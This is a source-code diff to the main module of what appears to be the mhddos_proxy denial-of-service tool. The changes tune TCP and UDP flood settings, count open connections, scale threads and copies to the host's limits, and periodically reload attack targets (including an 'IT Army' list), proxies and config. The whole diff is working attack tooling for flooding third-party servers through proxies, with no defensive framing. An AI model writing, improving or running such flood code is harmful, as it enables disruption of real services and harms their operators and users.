@@ -14,7 +14,7 @@ from typing import List, Optional, Set, Tuple, Union
 
 from src.cli import init_argparse
 from src.core import (
-    cl, COPIES_AUTO, CPU_COUNT, CPU_PER_COPY, DEFAULT_THREADS, logger, MAX_COPIES_AUTO, SCHEDULER_MAX_INIT_FRACTION,
+    cl, COPIES_AUTO, CPU_COUNT, DEFAULT_THREADS, LIMITS_PADDING, logger, MAX_COPIES_AUTO, SCHEDULER_MAX_INIT_FRACTION,
     SCHEDULER_MIN_INIT_FRACTION, setup_worker_logger, UDP_FAILURE_BUDGET_FACTOR, UDP_FAILURE_DELAY_SECONDS,
     USE_ONLY_MY_IP,
 )
@@ -22,7 +22,9 @@ from src.i18n import DEFAULT_LANGUAGE, set_language, translate as t
 from src.mhddos import AsyncTcpFlood, AsyncUdpFlood, AttackSettings, main as mhddos_main
 from src.output import print_banner, print_status, show_statistic
 from src.proxies import ProxySet
-from src.system import fix_ulimits, load_system_configs, setup_event_loop, WINDOWS_WAKEUP_SECONDS
+from src.system import (
+    detect_port_range_size, fix_ulimits, load_system_configs, NetStats, setup_event_loop, WINDOWS_WAKEUP_SECONDS,
+)
 from src.targets import Target, TargetsLoader
 
 
@@ -68,6 +70,10 @@ class GeminoCurseTaskSet:
 
     def __len__(self) -> int:
         return len(self._pending)
+
+    @property
+    def capacity(self) -> Tuple[int, int]:
+        return len(self), self._max_capacity
 
     def _launch(self, runnable) -> None:
         if self._shutdown_event.is_set():
@@ -125,9 +131,10 @@ async def run_ddos(args):
             "https://telegra.ph/Onovlennya-mhddos-proxy-04-16\n"
         )
 
-    debug, http_methods, initial_capacity, fork_scale = (
-        args.debug, args.http_methods,
-        args.scheduler_initial_capacity, args.scheduler_fork_scale
+    http_methods, initial_capacity, fork_scale = (
+        args.http_methods,
+        args.scheduler_initial_capacity,
+        args.scheduler_fork_scale
     )
 
     # we are going to fetch proxies even in case we have only UDP
@@ -135,10 +142,10 @@ async def run_ddos(args):
     threads = args.threads or DEFAULT_THREADS
     max_conns = fix_ulimits()
     if max_conns is not None:
-        max_conns -= 50  # keep some for other needs
+        max_conns -= LIMITS_PADDING  # keep some for other needs
         if max_conns < threads:
             logger.warning(
-                f"{cl.RED}{t('The number of threads has been reduced to')} {max_conns} "
+                f"{cl.MAGENTA}{t('The number of threads has been reduced to')} {max_conns} "
                 f"{t('due to the limitations of your system')}{cl.RESET}"
             )
             threads = max_conns
@@ -148,20 +155,22 @@ async def run_ddos(args):
     await asyncio.sleep(5)
 
     attack_settings = AttackSettings(
-        connect_timeout_seconds=8,
+        connect_timeout_seconds=8.0,
         dest_connect_timeout_seconds=10.0,
-        drain_timeout_seconds=10.0,
+        drain_timeout_seconds=15.0,
         close_timeout_seconds=1.0,
         http_response_timeout_seconds=15.0,
-        tcp_read_timeout_seconds=0.2,
+        tcp_read_timeout_seconds=0.5,
         requests_per_connection=args.rpc,
-        high_watermark=1024 << 4,
+        high_watermark=1024 << 5,
         # note that "generic flood" attacks switch reading off completely
         reader_limit=1024 << 2,
         socket_rcvbuf=1024 << 2,
+        requests_per_buffer=128,
     )
     loop = asyncio.get_event_loop()
-    stats = []
+
+    connections = set()
 
     def prepare_flooder(target: Target, method: str) -> Union[AsyncUdpFlood, AsyncTcpFlood]:
         if target.has_options:
@@ -174,17 +183,16 @@ async def run_ddos(args):
             settings = attack_settings
 
         return mhddos_main(
-            url=target.url,
-            ip=target.addr,
-            method=method,
-            stats=target.create_stats(method),
+            target,
+            method,
             proxies=proxies,
             loop=loop,
-            settings=settings
+            settings=settings,
+            connections=connections,
         )
 
     active_flooder_tasks = []
-    tcp_task_group = None
+    tcp_task_group: Optional[GeminoCurseTaskSet] = None
 
     async def install_targets(targets):
         print()
@@ -196,9 +204,8 @@ async def run_ddos(args):
                 task.cancel()
             active_flooder_tasks.clear()
 
-        stats.clear()
-
         tcp_flooders, udp_flooders = [], []
+        connections.clear()
         for target in targets:
             assert target.is_resolved, "Unresolved target cannot be used for attack"
             # udp://, method defaults to "UDP"
@@ -238,9 +245,6 @@ async def run_ddos(args):
                 int(SCHEDULER_MIN_INIT_FRACTION * threads / num_flooders)
             ) if num_flooders > 1 else threads
 
-            for flooder in tcp_flooders:
-                stats.append(flooder.stats)
-
             tcp_task_group = GeminoCurseTaskSet(
                 loop,
                 runnables=tcp_flooders,
@@ -254,7 +258,6 @@ async def run_ddos(args):
             tcp_task_group = None
 
         for flooder in udp_flooders:
-            stats.append(flooder.stats)
             task = loop.create_task(run_udp_flood(flooder))
             active_flooder_tasks.append(task)
 
@@ -269,7 +272,7 @@ async def run_ddos(args):
     targets_loader = TargetsLoader(args.targets, args.targets_config, config, it_army=args.itarmy)
     try:
         print()
-        initial_targets, _ = await targets_loader.reload()
+        initial_targets = await targets_loader.reload()
     except Exception as exc:
         logger.error(f"{cl.RED}{t('Targets loading failed')} {exc}{cl.RESET}")
         initial_targets = []
@@ -292,14 +295,18 @@ async def run_ddos(args):
     tasks = []
 
     async def stats_printer():
+        net_stats = NetStats()
         it, cycle_start = 0, time.perf_counter()
         refresh_rate = 5
 
         print_status(threads, use_my_ip, False)
         while True:
             await asyncio.sleep(refresh_rate)
-            show_statistic(stats, debug)
-
+            show_statistic(
+                net_stats,
+                tcp_task_group.capacity if tcp_task_group is not None else None,
+                len(connections),
+            )
             if it >= 20:
                 it = 0
                 passed = time.perf_counter() - cycle_start
@@ -312,26 +319,18 @@ async def run_ddos(args):
     # setup coroutine to print stats
     tasks.append(loop.create_task(stats_printer()))
 
-    reload_after = 5 * 60
-    reinstall_after_iter = 3
-
     async def reload_targets():
-        it = 0
+        period = 15 * 60
         while True:
             try:
-                await asyncio.sleep(reload_after)
-                it += 1
-
-                targets, is_changed = await targets_loader.reload()
-
-                if not targets:
+                await asyncio.sleep(period)
+                targets = await targets_loader.reload()
+                if targets:
+                    await install_targets(targets)
+                else:
                     logger.warning(
                         f"{cl.MAGENTA}{t('Empty config loaded - the previous one will be used')}{cl.RESET}"
                     )
-                elif is_changed or it >= reinstall_after_iter:
-                    it = 0
-                    await install_targets(targets)
-
             except asyncio.CancelledError as e:
                 raise e
             except Exception as exc:
@@ -341,14 +340,15 @@ async def run_ddos(args):
     tasks.append(loop.create_task(reload_targets()))
 
     async def reload_proxies():
+        period = 5 * 60
         while True:
             try:
-                await asyncio.sleep(reload_after)
-                if (await proxies.reload(config)) == 0:
+                await asyncio.sleep(period)
+                result = await proxies.reload(config)
+                if result == 0:
                     logger.warning(
                         f"{cl.MAGENTA}{t('Failed to reload proxy list - the previous one will be used')}{cl.RESET}"
                     )
-
             except asyncio.CancelledError:
                 raise
             except Exception:
@@ -359,9 +359,10 @@ async def run_ddos(args):
         tasks.append(loop.create_task(reload_proxies()))
 
     async def reload_config():
+        period = 5 * 60
         while True:
             try:
-                await asyncio.sleep(reload_after)
+                await asyncio.sleep(period)
                 _, new_config = await load_system_configs()
                 if new_config:
                     config.update(new_config)
@@ -410,7 +411,7 @@ def main():
         logger.error(f"{cl.RED}{t('No targets specified for the attack')}{cl.RESET}")
         sys.exit()
 
-    max_copies = max(1, CPU_COUNT // CPU_PER_COPY)
+    max_copies = max(1, CPU_COUNT - 1)
     num_copies = args.copies
     if args.copies == COPIES_AUTO:
         num_copies = min(max_copies, MAX_COPIES_AUTO)
@@ -418,14 +419,24 @@ def main():
     if num_copies > max_copies:
         num_copies = max_copies
         logger.warning(
-            f"{cl.RED}{t('The number of copies is automatically reduced to')} {max_copies}{cl.RESET}"
+            f"{cl.MAGENTA}{t('The number of copies is automatically reduced to')} {max_copies}{cl.RESET}"
         )
+
+    port_range_size = detect_port_range_size()
+    max_ports = port_range_size - LIMITS_PADDING
+    if num_copies * (args.threads or DEFAULT_THREADS) > max_ports:
+        args.threads = int(max_ports / num_copies)
+        if args.threads:
+            logger.warning(
+                f"{cl.MAGENTA}{t('The number of threads has been reduced to')} {args.threads} "
+                f"{t('due to the limitations of your system')}{cl.RESET}"
+            )
 
     print_banner(args)
 
     if args.debug:
         logger.warning(
-            f"{cl.CYAN}{t('The `--debug` option is not needed for common usage and may impact performance')}{cl.RESET}"
+            f"{cl.CYAN}{t('The `--debug` option is deprecated to avoid negative impact on performance')}{cl.RESET}"
         )
         print()
 
